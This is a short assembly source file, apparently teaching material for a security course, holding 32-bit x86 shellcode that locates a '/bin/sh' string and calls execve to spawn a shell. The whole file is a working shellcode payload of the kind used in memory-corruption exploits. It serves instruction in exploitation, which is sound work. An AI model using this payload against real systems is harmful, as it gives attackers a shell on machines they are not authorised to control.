BITS 32

; Author: Dr. Brown
; Course: SY421
; Description: 32-bit x86 string-compatible shellcode to execve /bin/sh

;execve(const char *filename, char *const argv[], char *const envp[]) [11]

jmp short one


two:
pop ebx			; filename ptr in ebx
xor eax, eax	; 
mov	[ebx+7], al	; ensure string is null-terminated
push eax
cdq				; clear edx, no environment
push eax		; null terminated argument array
push ebx		; argument0 (filename)
mov ecx, esp
mov al, 11		; execve syscall (11)
int 0x80

push esi			; added to return safely to shellcode caller

ret

one:
call two
msg db "/bin/sh"
